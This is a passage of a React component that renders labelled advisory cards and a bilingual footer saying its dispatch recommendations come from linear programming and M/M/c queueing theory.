              label = 'OPTIMIZED';
            }

            return (
              <div 
                key={adv.id} 
                className={`border p-3 text-xxs leading-relaxed flex items-start gap-3 transition-all ${typeColor}`}
              >
                <div className="border border-current px-1.5 py-0.5 font-black text-[9px] uppercase tracking-wide shrink-0">
                  {label}
                </div>
                <div className="flex-1">
                  {lang === 'es' ? adv.textEs : adv.textEn}
                </div>
              </div>
            );
          })}

          <div className="mt-2 bg-[#020202] border border-[#00FF41]/10 p-3 flex flex-col sm:flex-row justify-between items-center gap-3">
            <div className="flex items-center gap-2 text-xxs text-[#00FF41]/60">
              <Users className="w-4 h-4" />
              <span className="uppercase">
                {lang === 'es' 
                  ? 'Fórmulas basadas en Programación Lineal y Teoría de Colas M/M/c para despacho óptimo.'
                  : 'Prescriptions derived via Linear Programming & M/M/c Queueing dispatching theory.'}
              </span>
            </div>
            <div className="text-xxs font-mono text-white flex items-center gap-1.5">
              <span className="w-1.5 h-1.5 rounded-full bg-[#00FF41] animate-ping" />
              {lang === 'es' ? 'ALGORITMO ACTIVO' : 'MODEL SOLVER ACTIVE'}
            </div>
          </div>
        </div>
      </div>

    </div>
  );
}
